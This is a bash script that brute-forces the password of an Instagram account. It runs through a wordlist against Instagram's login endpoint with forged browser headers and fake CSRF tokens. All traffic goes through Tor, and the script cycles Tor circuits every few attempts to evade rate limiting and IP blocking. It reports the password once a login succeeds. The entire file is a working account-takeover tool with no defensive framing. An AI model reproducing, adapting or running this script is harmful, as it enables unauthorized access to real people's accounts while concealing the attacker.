#!/bin/bash
[ "$UID" -eq 0 ] || exec sudo bash "$0" "$@";
echo "Booting up Tor...";
(tor 1>/dev/null) &
sleep 10s;
echo "Ok...";
token=$(head /dev/urandom | base64 | tr -d '[:digit:]' | tr -d '+/=' | tail -c 33);
rand=$(head /dev/urandom | base64 | tr -d '[:alpha:]' | tr -d '+/=' | tail -c 11);
url='https://www.instagram.com/accounts/login/ajax/';
ct='Content-Type: application/x-www-form-urlencoded';
ac='Accept: */*';
ae='Accept-Encoding: gzip, deflate, br';
ho='Host: www.instagram.com';
or='Origin: https://www.instagram.com';
ua='User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15'; 
re='Referer: https://www.instagram.com/accounts/login/'; 
co='Connection: keep-alive';
req='X-Requested-With: XMLHttpRequest';
ig='X-IG-WWW-Claim: 0';
size=$(cat "$2" | wc -l);
progressive=1;
line_counter=1;
sedline=$line_counter'q;d';
line=$(sed $sedline "$2");
echo "Trying $line_counter of $size";
while :
do
curl --socks5 127.0.0.1:9050 -H "$ct" -H "$ac" -H "$ae" -H "$ho" -H "$or" -H "$ua" -H "$re" -H "$co" -H "$req" -H "$ig" -H "X-CSRFToken: $token" --data "username=$1&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A$rand%3A$line&queryParams=%7B%7D&optIntoOneTap=false" --compressed 1>response.txt "$url" 2>/dev/null;
response=$(cat response.txt);
if [[ $((progressive%4)) == 0 ]]; then
progressive=0;
killall -HUP tor;
sleep 2;
token=$(head /dev/urandom | base64 | tr -d '[:digit:]' | tr -d '+/=' | tail -c 33);
rand=$(head /dev/urandom | base64 | tr -d '[:alpha:]' | tr -d '+/=' | tail -c 11);
fi
if [[ $response == *'authenticated":true'* ]]; then
 echo "The Password is $line";
 return
fi
if [[ $response == *'authenticated":false'* ]]; 
then
 line_counter=$((line_counter+1));
 sedline=$line_counter'q;d';
 line=$(sed $sedline "$2");
 progressive=$((progressive+1));
 echo "Trying $line_counter of $size";
else
killall -HUP tor;
sleep 2;
token=$(head /dev/urandom | base64 | tr -d '[:digit:]' | tr -d '+/=' | tail -c 33);
rand=$(head /dev/urandom | base64 | tr -d '[:alpha:]' | tr -d '+/=' | tail -c 11);
fi
done
echo "Exiting";
